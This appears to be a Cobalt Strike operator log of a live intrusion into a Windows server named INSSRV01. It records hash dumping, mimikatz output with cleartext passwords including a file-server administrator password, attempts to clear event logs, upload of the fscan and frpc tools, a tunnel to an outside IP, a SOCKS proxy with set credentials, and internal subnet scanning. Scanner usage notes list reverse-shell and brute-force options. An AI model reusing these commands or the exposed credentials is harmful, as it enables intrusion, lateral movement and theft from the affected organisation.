@@ -1,0 +1,2908 @@
+02/04 08:29:19 UTC [metadata] 112.199.110.98 <- 192.168.5.15; computer: INSSRV01; user: SYSTEM *; process: cmd.exe; pid: 148; os: Windows; version: 5.2; build: 3790; beacon arch: x86
+02/04 08:29:16 UTC [task] <T1029> Tasked beacon to become interactive
+02/04 08:30:16 UTC [checkin] host called home, sent: 16 bytes
+02/04 08:30:28 UTC [input] <karson> hashdump
+02/04 08:30:28 UTC [task] <T1003, T1055, T1093> Tasked beacon to dump hashes
+02/04 08:30:29 UTC [checkin] host called home, sent: 63597 bytes
+02/04 08:30:31 UTC [output]
+received password hashes:
+admin:1022:2909e8252a9a5a7e81ef78323c06074d:a394dc6a6008a0facef91b89d72306ef:::
+admin01:1043:f1770222cbf245cf7eff1d4397f100f5:5d01de78153ad61100832202367743fb:::
+admin15:1046:2674f0706faf528c66255a7bfc3f0108:3f608f8581f54092e8ec44e05676a44f:::
+ASPNET:1015:f7b56ff83b94be11046e8299bb9a3111:727ba5b25cdad96f45cfbe9ab77d25aa:::
+devadmin:1048:3c5705577b5f8f71ccf9155e3e7db453:91fb7ac0f77462f37133c60d911b87c4:::
+dhlmanila:1041:0a471c4d32c8a721b09321e47427af3c:480b7446f60af1a39b898b3934cb4ff4:::
+Guest:501:e7b72cc2eb0602d8aad3b435b51404ee:5fc58c7d5582d5ecbcb50d513dc7142a:::
+Help32:1049:dcbd61315679c33d27ed6b53862a8ed9:1868213dc39d0b8117963ceb37933dfb:::
+insnet:1021:f1770222cbf245cf1aa818381e4e281b:d4fb8befb0a5735666b55efac63d54c7:::
+IUSR_INSSRV01:1011:cfcd6cee0f417992e12968d05e1f4f9a:b0ab848d889f5d4e466bcf8d28da115f:::
+IWAM_INSSRV01:1012:737db6801e76d91f47463ddd7654ca45:dcdec748e920d3af865b9a7c927267d5:::
+jong:1033:a1f0f6b1993d0bae1aa818381e4e281b:c398cbc80d8022ab303a4d1ad1fc6729:::
+ktnet:1017:0d149941a42ca347aad3b435b51404ee:f405d9f50c263afc091d66f1e6344fba:::
+PezaUser:1038:78379c927954dd681aa818381e4e281b:fa91468e7f6bf7e1278879fbe633134f:::
+ramel:500:c28e4a79e854f1e209b6caa7bb7c6527:0694eca09e067b0d3b31d6f1c7c9316c:::
+sqlagent:1064:0182bd0bd4444bf836077a718ccdf409:259745cb123a52aa2e693aaacca2db52:::
+SUPPORT_388945a0:1001:aad3b435b51404eeaad3b435b51404ee:e4c5aacca9701a59a2758253a6a25a65:::
+tim:1019:4f0277613439633baad3b435b51404ee:6386255500fdb3a1c83a124685654883:::
+
+
+02/04 08:30:40 UTC [input] <karson> logonpasswords
+02/04 08:30:40 UTC [task] <T1003, T1055, T1093> Tasked beacon to run mimikatz's sekurlsa::logonpasswords command
+02/04 08:30:41 UTC [checkin] host called home, sent: 253562 bytes
+02/04 08:30:43 UTC [output]
+received output:
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : NETWORK SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 5/13/2023 11:02:41 AM
+SID               : S-1-5-20
+	msv :	
+	 [00000002] Primary
+	 * Username : INSSRV01$
+	 * Domain   : WORKGROUP
+	 * LM       : aad3b435b51404eeaad3b435b51404ee
+	 * NTLM     : 31d6cfe0d16ae931b73c59d7e0c089c0
+	 * SHA1     : da39a3ee5e6b4b0d3255bfef95601890afd80709
+	wdigest :	
+	 * Username : INSSRV01$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	 * Username : inssrv01$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 2 ; 2203753299 (00000002:835a9b53)
+Session           : NetworkCleartext from 0
+User Name         : IUSR_INSSRV01
+Domain            : INSSRV01
+Logon Server      : INSSRV01
+Logon Time        : 2/4/2024 3:14:25 PM
+SID               : S-1-5-21-752021878-59572685-2517579372-1011
+	msv :	
+	 [00000002] Primary
+	 * Username : IUSR_INSSRV01
+	 * Domain   : INSSRV01
+	 * LM       : cfcd6cee0f417992e12968d05e1f4f9a
+	 * NTLM     : b0ab848d889f5d4e466bcf8d28da115f
+	 * SHA1     : 851bb6b5c9d72aeda3e6b009e945a88e73ead9d9
+	wdigest :	
+	 * Username : IUSR_INSSRV01
+	 * Domain   : INSSRV01
+	 * Password : 7aDh\u~7r'g%ZQ
+	kerberos :	
+	 * Username : IUSR_INSSRV01
+	 * Domain   : INSSRV01
+	 * Password : 7aDh\u~7r'g%ZQ
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 56068183 (00000000:03578857)
+Session           : RemoteInteractive from 1
+User Name         : admin15
+Domain            : INSSRV01
+Logon Server      : INSSRV01
+Logon Time        : 5/15/2023 3:21:26 PM
+SID               : S-1-5-21-752021878-59572685-2517579372-1046
+	msv :	
+	 [00000002] Primary
+	 * Username : admin15
+	 * Domain   : INSSRV01
+	 * LM       : 2674f0706faf528c66255a7bfc3f0108
+	 * NTLM     : 3f608f8581f54092e8ec44e05676a44f
+	 * SHA1     : 18892ff8b0e4cc5021428a1bf7765db8b8410607
+	wdigest :	
+	 * Username : admin15
+	 * Domain   : INSSRV01
+	 * Password : D1versit@
+	kerberos :	
+	 * Username : admin15
+	 * Domain   : INSSRV01
+	 * Password : D1versit@
+	ssp :	
+	 [00000000]
+	 * Username : administrator
+	 * Domain   : FILESERVER
+	 * Password : R0yalblood!21
+	credman :	
+	 [00000000]
+	 * Username : FILESERVER\administrator
+	 * Domain   : 192.168.5.107
+	 * Password : R0yalblood!
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 5/13/2023 11:02:41 AM
+SID               : S-1-5-19
+	msv :	
+	wdigest :	
+	kerberos :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 51071 (00000000:0000c77f)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 5/13/2023 11:02:30 AM
+SID               : 
+	msv :	
+	wdigest :	
+	kerberos :	
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : INSSRV01$
+Domain            : WORKGROUP
+Logon Server      : (null)
+Logon Time        : 5/13/2023 11:02:30 AM
+SID               : S-1-5-18
+	msv :	
+	wdigest :	
+	kerberos :	
+	 * Username : inssrv01$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+
+02/04 08:34:59 UTC [output]
+9========== 与指定主机建立IPC连接 ==========
+
+02/04 08:35:16 UTC [output]
+9=========== 上传 Fscan ==========
+
+02/04 08:36:01 UTC [task] <> cd C:\Users\Anonymous\Desktop\fsdownload\fscan32.exe
+02/04 08:36:01 UTC [checkin] host called home, sent: 57 bytes
+02/04 08:36:20 UTC [task] <> Tasked beacon to upload C:\Users\Anonymous\Desktop\fsdownload\LSTAR\scripts\IntrScan\x86\fscan.exe as fscan.exe
+02/04 08:36:22 UTC [checkin] host called home, sent: 786453 bytes
+02/04 08:36:24 UTC [checkin] host called home, sent: 1040468 bytes
+02/04 08:36:26 UTC [checkin] host called home, sent: 1040468 bytes
+02/04 08:36:29 UTC [warning] Unable to add task of 260117 bytes as it is over the available size of 8108 bytes. 1 task(s) on hold until next checkin.
+02/04 08:36:29 UTC [checkin] host called home, sent: 1040468 bytes
+02/04 08:36:29 UTC [indicator] file: d5054ed83e63f911be46b3ff8af82267 4546560 bytes fscan.exe
+02/04 08:36:30 UTC [checkin] host called home, sent: 639039 bytes
+02/04 08:43:05 UTC [output]
+9=========== 获取 RDP 端口 ==========
+
+02/04 08:43:05 UTC [output]
+手动确认：shell netstat -ano | findstr $RDP端口
+
+02/04 08:43:05 UTC [output]
+Check Rdp Open Port
+
+02/04 08:43:05 UTC [task] <T1086, T1064> Tasked beacon to import: C:\Users\Anonymous\Desktop\fsdownload\LSTAR\scripts\RemoteLogin\RegRdpPort.ps1
+02/04 08:43:05 UTC [task] <T1086, T1093> Tasked beacon to run: RegRdpPort (unmanaged)
+02/04 08:43:05 UTC [checkin] host called home, sent: 510 bytes
+02/04 08:43:05 UTC [task] <T1059> Tasked beacon to run: wevtutil cl "Windows PowerShell"
+02/04 08:43:05 UTC [checkin] host called home, sent: 125102 bytes
+02/04 08:43:11 UTC [output]
+received output:
+Failed to invoke InvokePS w/hr 0x80131604
+Failed to invoke InvokePS w/hr 0x80131604
+
+
+02/04 08:43:11 UTC [output]
+received output:
+'wevtutil' is not recognized as an internal or external command,
+operable program or batch file.
+
+
+02/04 08:43:27 UTC [output]
+9=========== 查询 RDP 状态 ==========
+
+02/04 08:43:27 UTC [task] <T1086, T1064> Tasked beacon to import: C:\Users\Anonymous\Desktop\fsdownload\LSTAR\scripts\RemoteLogin\CheckRdpStatus.ps1
+02/04 08:43:27 UTC [task] <T1086, T1093> Tasked beacon to run: CheckRdpStatus (unmanaged)
+02/04 08:43:27 UTC [checkin] host called home, sent: 594 bytes
+02/04 08:43:27 UTC [task] <T1059> Tasked beacon to run: wevtutil cl "Windows PowerShell"
+02/04 08:43:27 UTC [checkin] host called home, sent: 125102 bytes
+02/04 08:43:29 UTC [output]
+received output:
+Failed to invoke InvokePS w/hr 0x80131604
+Failed to invoke InvokePS w/hr 0x80131604
+
+
+02/04 08:43:29 UTC [output]
+received output:
+'wevtutil' is not recognized as an internal or external command,
+operable program or batch file.
+
+
+02/04 08:43:46 UTC [output]
+9=========== 运行 Fscan ==========
+
+02/04 08:43:46 UTC [task] <> Fscan
+02/04 08:43:46 UTC [task] <> fscan.exe -h 192.168.1.1/24                                    (默认使用全部模块)
+02/04 08:43:46 UTC [task] <> fscan.exe -h 192.168.1.1/16                                    (B段扫描)
+02/04 08:43:46 UTC [task] <> 其他用法：
+02/04 08:43:46 UTC [task] <> fscan.exe -h 192.168.1.1/24 -np -no -nopoc                     (跳过存活检测、不保存文件、跳过web poc扫描)
+02/04 08:43:46 UTC [task] <> fscan.exe -h 192.168.1.1/24 -rf id_rsa.pub                     (redis 写公钥)
+02/04 08:43:46 UTC [task] <> fscan.exe -h 192.168.1.1/24 -rs 192.168.1.1:6666               (redis 计划任务反弹shell)
+02/04 08:43:46 UTC [task] <> fscan.exe -h 192.168.1.1/24 -pwdf pwd.txt -userf users.txt     (加载指定文件的用户名、密码来进行爆破)
+02/04 08:43:46 UTC [task] <> fscan.exe -h 192.168.1.1/24 -o /tmp/1.txt                      (指定扫描结果保存路径,默认保存在当前路径)
+02/04 08:43:46 UTC [task] <> fscan.exe -h 192.168.1.1/8                                     (A段的192.x.x.1和192.x.x.254,方便快速查看网段信息)
+02/04 08:43:46 UTC [task] <> fscan.exe -h 192.168.1.1/24 -m smb -pwd password               (smb密码碰撞)
+02/04 08:43:46 UTC [task] <> fscan.exe -h 192.168.1.1/24 -c whoami                          (ssh 爆破成功后，命令执行)
+02/04 08:43:46 UTC [task] <> fscan.exe -h 192.168.1.1/24 -m ssh -p 2222                     (指定模块ssh和端口)
+02/04 08:43:46 UTC [task] <> fscan.exe -h 192.168.1.1/24 -m ms17010                         (指定模块)
+02/04 08:43:46 UTC [task] <> fscan.exe -h 192.0.0.0/8 -m icmp                               (探测每个C段的网关和数个随机IP,并统计top 10 B、C段存活数量)
+02/04 08:43:46 UTC [task] <>  
+02/04 08:43:46 UTC [task] <> fscan.exe -h      (查看完整使用方法)
+02/04 08:43:59 UTC [task] <T1059> Tasked beacon to run: fscan32.exe -h 192.168.1.1/24 -o out.txt
+02/04 08:43:59 UTC [checkin] host called home, sent: 58 bytes
+02/04 08:43:59 UTC [error] could not spawn fscan32.exe -h 192.168.1.1/24 -o out.txt: 2 - ERROR_FILE_NOT_FOUND
+02/04 08:53:50 UTC [output]
+9=========== 上传 Fscan ==========
+
+02/04 08:53:51 UTC [task] <> cd C:\Windows\Temp\
+02/04 08:53:51 UTC [checkin] host called home, sent: 24 bytes
+02/04 08:54:08 UTC [task] <> Tasked beacon to upload C:\Users\Anonymous\Desktop\fsdownload\LSTAR\scripts\IntrScan\x86\fscan.exe as fscan.exe
+02/04 08:54:09 UTC [checkin] host called home, sent: 786453 bytes
+02/04 08:54:10 UTC [checkin] host called home, sent: 520234 bytes
+02/04 08:54:11 UTC [checkin] host called home, sent: 260117 bytes
+02/04 08:54:11 UTC [checkin] host called home, sent: 260117 bytes
+02/04 08:54:12 UTC [checkin] host called home, sent: 260117 bytes
+02/04 08:54:12 UTC [checkin] host called home, sent: 260117 bytes
+02/04 08:54:13 UTC [checkin] host called home, sent: 260117 bytes
+02/04 08:54:13 UTC [checkin] host called home, sent: 260117 bytes
+02/04 08:54:14 UTC [checkin] host called home, sent: 260117 bytes
+02/04 08:54:14 UTC [checkin] host called home, sent: 260117 bytes
+02/04 08:54:14 UTC [checkin] host called home, sent: 260117 bytes
+02/04 08:54:15 UTC [checkin] host called home, sent: 260117 bytes
+02/04 08:54:16 UTC [indicator] file: d5054ed83e63f911be46b3ff8af82267 4546560 bytes fscan.exe
+02/04 08:54:17 UTC [checkin] host called home, sent: 639039 bytes
+02/04 08:55:32 UTC [output]
+9=========== 运行 Fscan ==========
+
+02/04 08:55:32 UTC [task] <> Fscan
+02/04 08:55:32 UTC [task] <> fscan.exe -h 192.168.1.1/24                                    (默认使用全部模块)
+02/04 08:55:32 UTC [task] <> fscan.exe -h 192.168.1.1/16                                    (B段扫描)
+02/04 08:55:32 UTC [task] <> 其他用法：
+02/04 08:55:32 UTC [task] <> fscan.exe -h 192.168.1.1/24 -np -no -nopoc                     (跳过存活检测、不保存文件、跳过web poc扫描)
+02/04 08:55:32 UTC [task] <> fscan.exe -h 192.168.1.1/24 -rf id_rsa.pub                     (redis 写公钥)
+02/04 08:55:32 UTC [task] <> fscan.exe -h 192.168.1.1/24 -rs 192.168.1.1:6666               (redis 计划任务反弹shell)
+02/04 08:55:32 UTC [task] <> fscan.exe -h 192.168.1.1/24 -pwdf pwd.txt -userf users.txt     (加载指定文件的用户名、密码来进行爆破)
+02/04 08:55:32 UTC [task] <> fscan.exe -h 192.168.1.1/24 -o /tmp/1.txt                      (指定扫描结果保存路径,默认保存在当前路径)
+02/04 08:55:32 UTC [task] <> fscan.exe -h 192.168.1.1/8                                     (A段的192.x.x.1和192.x.x.254,方便快速查看网段信息)
+02/04 08:55:32 UTC [task] <> fscan.exe -h 192.168.1.1/24 -m smb -pwd password               (smb密码碰撞)
+02/04 08:55:32 UTC [task] <> fscan.exe -h 192.168.1.1/24 -c whoami                          (ssh 爆破成功后，命令执行)
+02/04 08:55:32 UTC [task] <> fscan.exe -h 192.168.1.1/24 -m ssh -p 2222                     (指定模块ssh和端口)
+02/04 08:55:32 UTC [task] <> fscan.exe -h 192.168.1.1/24 -m ms17010                         (指定模块)
+02/04 08:55:32 UTC [task] <> fscan.exe -h 192.0.0.0/8 -m icmp                               (探测每个C段的网关和数个随机IP,并统计top 10 B、C段存活数量)
+02/04 08:55:32 UTC [task] <>  
+02/04 08:55:32 UTC [task] <> fscan.exe -h      (查看完整使用方法)
+02/04 08:55:37 UTC [task] <T1059> Tasked beacon to run: fscan.exe -h 192.168.1.1/24 -o out.txt
+02/04 08:55:37 UTC [checkin] host called home, sent: 56 bytes
+02/04 08:55:38 UTC [error] could not spawn fscan.exe -h 192.168.1.1/24 -o out.txt: 193 - ERROR_BAD_EXE_FORMAT
+02/04 09:02:13 UTC [input] <karson> shell D:/WebSites/2008/ghost.exe -h 192.168.1.1/24 -o out.txt
+02/04 09:02:13 UTC [task] <T1059> Tasked beacon to run: D:/WebSites/2008/ghost.exe -h 192.168.1.1/24 -o out.txt
+02/04 09:02:13 UTC [checkin] host called home, sent: 86 bytes
+02/04 09:05:54 UTC [output]
+9=========== 上传 frpc ==========
+
+02/04 09:05:56 UTC [task] <> cd C:\Windows\Temp\
+02/04 09:05:56 UTC [checkin] host called home, sent: 24 bytes
+02/04 09:06:33 UTC [task] <> Tasked beacon to upload C:\Users\Anonymous\Desktop\fsdownload\LSTAR\scripts\IntrAgent\x86\frpcx.exe as frpcx.exe
+02/04 09:06:34 UTC [checkin] host called home, sent: 786453 bytes
+02/04 09:06:35 UTC [checkin] host called home, sent: 520234 bytes
+02/04 09:06:36 UTC [checkin] host called home, sent: 520234 bytes
+02/04 09:06:37 UTC [checkin] host called home, sent: 520234 bytes
+02/04 09:06:38 UTC [checkin] host called home, sent: 520234 bytes
+02/04 09:06:39 UTC [checkin] host called home, sent: 520234 bytes
+02/04 09:06:39 UTC [checkin] host called home, sent: 260117 bytes
+02/04 09:06:40 UTC [checkin] host called home, sent: 260117 bytes
+02/04 09:06:40 UTC [checkin] host called home, sent: 260117 bytes
+02/04 09:06:41 UTC [checkin] host called home, sent: 260117 bytes
+02/04 09:06:41 UTC [checkin] host called home, sent: 260117 bytes
+02/04 09:06:42 UTC [checkin] host called home, sent: 520234 bytes
+02/04 09:06:43 UTC [checkin] host called home, sent: 520234 bytes
+02/04 09:06:44 UTC [checkin] host called home, sent: 260117 bytes
+02/04 09:06:44 UTC [checkin] host called home, sent: 260117 bytes
+02/04 09:06:45 UTC [checkin] host called home, sent: 520234 bytes
+02/04 09:06:46 UTC [checkin] host called home, sent: 260117 bytes
+02/04 09:06:46 UTC [checkin] host called home, sent: 260117 bytes
+02/04 09:06:47 UTC [checkin] host called home, sent: 260117 bytes
+02/04 09:06:47 UTC [checkin] host called home, sent: 260117 bytes
+02/04 09:06:48 UTC [checkin] host called home, sent: 260117 bytes
+02/04 09:06:48 UTC [checkin] host called home, sent: 260117 bytes
+02/04 09:06:48 UTC [checkin] host called home, sent: 260117 bytes
+02/04 09:06:49 UTC [checkin] host called home, sent: 260117 bytes
+02/04 09:06:49 UTC [indicator] file: 03f45692db10fe291de65f15ca9761af 9107456 bytes frpcx.exe
+02/04 09:06:49 UTC [checkin] host called home, sent: 258069 bytes
+02/04 09:07:28 UTC [output]
+9=========== 运行 frpc ==========
+
+02/04 09:16:43 UTC [task] <T1059> Tasked beacon to run: frpcx.exe -t 107.151.246.11 -p 7000
+02/04 09:16:43 UTC [checkin] host called home, sent: 66 bytes
+02/04 09:20:09 UTC [output]
+9=========== 停止 frpc ==========
+
+02/04 09:20:09 UTC [task] <T1059> Tasked beacon to run: taskkill -f /im frpcx.exe
+02/04 09:20:09 UTC [checkin] host called home, sent: 56 bytes
+02/04 09:20:09 UTC [output]
+received output:
+ERROR: The process "frpcx.exe" not found.
+
+
+02/04 09:30:25 UTC [input] <karson> socks 57504 SOCKS5 enableNoAuth "karson" "karsonwudi666" disableLogging
+02/04 09:30:25 UTC [output]
+started SOCKS5 server on: 57504
+
+02/04 09:30:26 UTC [checkin] host called home, sent: 16 bytes
+02/04 09:34:29 UTC [input] <karson> shell netsta
+02/04 09:34:29 UTC [task] <T1059> Tasked beacon to run: netsta
+02/04 09:34:29 UTC [checkin] host called home, sent: 37 bytes
+02/04 09:34:29 UTC [output]
+received output:
+'netsta' is not recognized as an internal or external command,
+operable program or batch file.
+
+
+02/04 09:34:32 UTC [input] <karson> shell netstat
+02/04 09:34:32 UTC [task] <T1059> Tasked beacon to run: netstat
+02/04 09:34:32 UTC [checkin] host called home, sent: 38 bytes
+02/04 09:35:49 UTC [output]
+received output:
+
+Active Connections
+
+  Proto  Local Address          Foreign Address        State
+  TCP    INSSRV01:epmap         INSSRV01:1621          ESTABLISHED
+  TCP    INSSRV01:1025          INSSRV01:1622          ESTABLISHED
+  TCP    INSSRV01:ms-sql-s      INSSRV01:3937          ESTABLISHED
+  TCP    INSSRV01:ms-sql-s      INSSRV01:4242          ESTABLISHED
+  TCP    INSSRV01:ms-sql-s      INSSRV01:4243          ESTABLISHED
+  TCP    INSSRV01:1621          INSSRV01:epmap         ESTABLISHED
+  TCP    INSSRV01:1622          INSSRV01:1025          ESTABLISHED
+  TCP    INSSRV01:3937          INSSRV01:ms-sql-s      ESTABLISHED
+  TCP    INSSRV01:4103          INSSRV01:ms-sql-s      TIME_WAIT
+  TCP    INSSRV01:4104          INSSRV01:ms-sql-s      TIME_WAIT
+  TCP    INSSRV01:4242          INSSRV01:ms-sql-s      ESTABLISHED
+  TCP    INSSRV01:4243          INSSRV01:ms-sql-s      ESTABLISHED
+  TCP    INSSRV01:4648          INSSRV01:ms-sql-s      TIME_WAIT
+  TCP    INSSRV01:4651          INSSRV01:ms-sql-s      TIME_WAIT
+  TCP    INSSRV01:4687          INSSRV01:ms-sql-s      TIME_WAIT
+  TCP    INSSRV01:http          192.168.5.1:6953       CLOSE_WAIT
+  TCP    INSSRV01:http          192.168.5.1:6999       CLOSE_WAIT
+  TCP    INSSRV01:http          192.168.5.1:8187       CLOSE_WAIT
+  TCP    INSSRV01:http          192.168.5.1:8191       CLOSE_WAIT
+  TCP    INSSRV01:http          192.168.5.1:9101       CLOSE_WAIT
+  TCP    INSSRV01:http          192.168.5.1:12141      CLOSE_WAIT
+  TCP    INSSRV01:http          192.168.5.1:16369      CLOSE_WAIT
+  TCP    INSSRV01:http          192.168.5.1:17085      CLOSE_WAIT
+  TCP    INSSRV01:http          192.168.5.1:19419      CLOSE_WAIT
+  TCP    INSSRV01:http          192.168.5.1:21029      CLOSE_WAIT
+  TCP    INSSRV01:http          192.168.5.1:21061      CLOSE_WAIT
+  TCP    INSSRV01:http          192.168.5.1:21635      CLOSE_WAIT
+  TCP    INSSRV01:http          192.168.5.1:22553      CLOSE_WAIT
+  TCP    INSSRV01:http          192.168.5.1:25229      CLOSE_WAIT
+  TCP    INSSRV01:http          192.168.5.1:27951      CLOSE_WAIT
+  TCP    INSSRV01:http          192.168.5.1:32221      CLOSE_WAIT
+  TCP    INSSRV01:ms-wbt-server  WORKGROUP:61056        ESTABLISHED
+  TCP    INSSRV01:4022          NASDRV01:microsoft-ds  ESTABLISHED
+  TCP    INSSRV01:4101          107.151.246.11:8849    LAST_ACK
+
+
+02/04 09:39:07 UTC [input] <karson> shell tasklist | findstr "ghost"
+02/04 09:39:07 UTC [task] <T1059> Tasked beacon to run: tasklist | findstr "ghost"
+02/04 09:39:07 UTC [checkin] host called home, sent: 57 bytes
+02/04 09:49:34 UTC [input] <karson> shell tasklist | findstr "ghost"
+02/04 09:49:34 UTC [task] <T1059> Tasked beacon to run: tasklist | findstr "ghost"
+02/04 09:49:34 UTC [checkin] host called home, sent: 57 bytes
+02/04 09:54:46 UTC [input] <karson> shell tasklist
+02/04 09:54:46 UTC [task] <T1059> Tasked beacon to run: tasklist
+02/04 09:54:46 UTC [checkin] host called home, sent: 39 bytes
+02/04 09:54:46 UTC [output]
+received output:
+
+Image Name                     PID Session Name        Session#    Mem Usage
+========================= ======== ================ =========== ============
+System Idle Process              0 Console                    0         28 K
+System                           4 Console                    0        272 K
+smss.exe                       376 Console                    0        520 K
+csrss.exe                      424 Console                    0      5,800 K
+winlogon.exe                   448 Console                    0     10,972 K
+services.exe                   496 Console                    0     53,476 K
+lsass.exe                      508 Console                    0     14,204 K
+svchost.exe                    668 Console                    0      3,340 K
+svchost.exe                    760 Console                    0      4,776 K
+svchost.exe                    832 Console                    0      5,488 K
+svchost.exe                    868 Console                    0      7,068 K
+svchost.exe                    884 Console                    0     28,176 K
+msdtc.exe                     1056 Console                    0      5,100 K
+cisvc.exe                     1168 Console                    0      1,920 K
+svchost.exe                   1248 Console                    0      2,564 K
+hMailServer.exe               1280 Console                    0      8,004 K
+inetinfo.exe                  1392 Console                    0     12,588 K
+jqs.exe                       1416 Console                    0      1,448 K
+LMS.exe                       1464 Console                    0      2,808 K
+MsDtsSrvr.exe                 1484 Console                    0     19,888 K
+sqlservr.exe                  1580 Console                    0  1,086,832 K
+msmdsrv.exe                   1636 Console                    0     23,468 K
+svchost.exe                   1740 Console                    0      2,016 K
+ReportingServicesService.     1760 Console                    0     89,556 K
+sqlbrowser.exe                1856 Console                    0      7,824 K
+sqlwriter.exe                 1920 Console                    0      4,144 K
+UNS.exe                       1964 Console                    0     64,620 K
+winvnc4.exe                   2140 Console                    0      4,756 K
+msftesql.exe                  2196 Console                    0      4,612 K
+svchost.exe                   2252 Console                    0      7,520 K
+SQLAGENT90.EXE                2496 Console                    0      7,292 K
+svchost.exe                   2632 Console                    0      5,492 K
+svchost.exe                   2656 Console                    0      4,404 K
+wmiprvse.exe                  2820 Console                    0      5,708 K
+alg.exe                       3052 Console                    0      3,308 K
+cidaemon.exe                  3636 Console                    0      1,444 K
+cidaemon.exe                  3676 Console                    0      1,544 K
+cidaemon.exe                  3844 Console                    0      1,592 K
+logon.scr                     3788 Console                    0      1,984 K
+csrss.exe                     3668 RDP-Tcp#34                 1      1,956 K
+winlogon.exe                   200 RDP-Tcp#34                 1      3,708 K
+rdpclip.exe                   3472 RDP-Tcp#34                 1      1,628 K
+explorer.exe                  3140 RDP-Tcp#34                 1     13,528 K
+jusched.exe                   1192 RDP-Tcp#34                 1      4,608 K
+RTHDCPL.EXE                   4072 RDP-Tcp#34                 1      2,328 K
+ctfmon.exe                    2364 RDP-Tcp#34                 1        604 K
+Tomcat7w.exe                   684 RDP-Tcp#34                 1        308 K
+SqlWb.exe                     1812 RDP-Tcp#34                 1     18,412 K
+wmiprvse.exe                  1228 Console                    0      8,344 K
+wuauclt.exe                   5544 RDP-Tcp#34                 1      4,004 K
+scrnsave.scr                  3920 RDP-Tcp#34                 1      1,588 K
+cmd1.exe                      4540 Console                    0      4,136 K
+w3wp.exe                       636 Console                    0     18,008 K
+cmd1.exe                      3892 Console                    0      1,840 K
+system.exe                    6080 Console                    0      7,280 K
+cmd.exe                        148 Console                    0      7,592 K
+cmd.exe                       4108 Console                    0      4,596 K
+cmd.exe                       5820 Console                    0      4,568 K
+cmd1.exe                       896 Console                    0      4,100 K
+cmd.exe                       4692 Console                    0      1,816 K
+tasklist.exe                  3760 Console                    0      4,224 K
+
+
+02/04 09:55:11 UTC [checkin] host called home, sent: 1658 bytes
+02/04 09:55:56 UTC [output]
+2Ladon 192.168.1.1/24 WebScan
+
+02/04 09:56:00 UTC [checkin] host called home, sent: 484439 bytes
+02/04 09:56:02 UTC [output]
+received output:
+Ladon 9.1.1
+Start: 2024-02-04 17:57:06
+Runtime: .net 4.0  me: x86 OS: x86
+OS Name: Microsoft(R) Windows(R) Server 2003, Enterprise Edition
+Machine Make: Acer
+RunUser: SYSTEM PR: *IsSystem
+Priv: SeImpersonatePrivilege Enabled
+PID: 5368  CurrentProcess: rundll32
+FreeSpace: Disk C:\ 23160 MB
+
+
+
+02/04 09:56:02 UTC [output]
+received output:
+Ladon For Cobalt Strike
+Error: Exception has been thrown by the target of an invocation.
+
+
+02/04 09:56:29 UTC [output]
+2Ladon 192.168.1.1/24 OnlineIP
+
+02/04 09:56:34 UTC [checkin] host called home, sent: 484441 bytes
+02/04 09:56:36 UTC [output]
+received output:
+Ladon 9.1.1
+Start: 2024-02-04 17:57:40
+Runtime: .net 4.0  me: x86 OS: x86
+OS Name: Microsoft(R) Windows(R) Server 2003, Enterprise Edition
+Machine Make: Acer
+RunUser: SYSTEM PR: *IsSystem
+Priv: SeImpersonatePrivilege Enabled
+PID: 4184  CurrentProcess: rundll32
+FreeSpace: Disk C:\ 23162 MB
+
+load OnlineIP
+192.168.1.1/24 is Valid CIDR
+
+
+02/04 09:56:36 UTC [output]
+received output:
+IPCound: 256
+Scan Start: 2024-02-04 17:57:40
+
+
+02/04 09:56:36 UTC [output]
+received output:
+192.168.1.52
+192.168.1.58
+192.168.1.16
+192.168.1.54
+192.168.1.74
+192.168.1.15
+192.168.1.76
+192.168.1.65
+192.168.1.51
+192.168.1.62
+192.168.1.2
+192.168.1.56
+192.168.1.60
+192.168.1.72
+192.168.1.63
+192.168.1.42
+192.168.1.20
+192.168.1.66
+192.168.1.43
+192.168.1.70
+192.168.1.61
+192.168.1.68
+192.168.1.57
+192.168.1.55
+192.168.1.77
+192.168.1.53
+192.168.1.13
+192.168.1.71
+192.168.1.17
+192.168.1.67
+192.168.1.40
+192.168.1.80
+192.168.1.59
+192.168.1.64
+192.168.1.50
+192.168.1.75
+
+
+02/04 09:56:37 UTC [output]
+received output:
+192.168.1.45
+
+
+02/04 09:56:37 UTC [output]
+received output:
+192.168.1.30
+
+
+02/04 09:56:47 UTC [output]
+received output:
+192.168.1.82
+192.168.1.81
+192.168.1.86
+192.168.1.87
+192.168.1.88
+192.168.1.89
+192.168.1.90
+192.168.1.91
+192.168.1.96
+192.168.1.95
+192.168.1.98
+192.168.1.99
+192.168.1.100
+192.168.1.102
+192.168.1.108
+192.168.1.109
+192.168.1.111
+192.168.1.110
+192.168.1.114
+192.168.1.105
+192.168.1.103
+192.168.1.117
+192.168.1.116
+192.168.1.115
+192.168.1.120
+192.168.1.119
+192.168.1.121
+192.168.1.124
+192.168.1.128
+192.168.1.106
+192.168.1.101
+
+
+02/04 09:56:48 UTC [output]
+received output:
+192.168.1.122
+
+
+02/04 09:56:56 UTC [output]
+received output:
+192.168.1.163
+192.168.1.164
+192.168.1.173
+192.168.1.185
+192.168.1.186
+192.168.1.201
+192.168.1.200
+192.168.1.203
+192.168.1.202
+192.168.1.205
+192.168.1.204
+192.168.1.206
+192.168.1.208
+192.168.1.207
+192.168.1.211
+192.168.1.215
+192.168.1.220
+192.168.1.224
+192.168.1.239
+192.168.1.235
+
+
+02/04 09:57:05 UTC [output]
+received output:
+=============================================
+OnlinePC:87
+Cidr Scan Finished!
+End: 2024-02-04 17:58:09
+
+
+02/04 10:24:58 UTC [checkin] host called home, sent: 1658 bytes
